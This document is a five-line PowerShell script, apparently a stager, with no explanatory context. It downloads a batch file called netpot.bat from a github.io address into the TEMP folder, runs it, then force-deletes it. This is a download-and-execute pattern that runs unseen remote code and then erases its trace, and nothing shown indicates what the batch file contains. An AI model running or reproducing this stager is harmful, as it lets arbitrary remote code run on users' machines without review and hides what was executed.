$batUrl = 'https://young-zerka.github.io/netpot/netpot.bat'
$tempPath = "$env:TEMP\netpot.bat"
Invoke-WebRequest -Uri $batUrl -OutFile $tempPath -UseBasicParsing
Start-Process -FilePath $tempPath -Wait
Remove-Item -Path $tempPath -Force
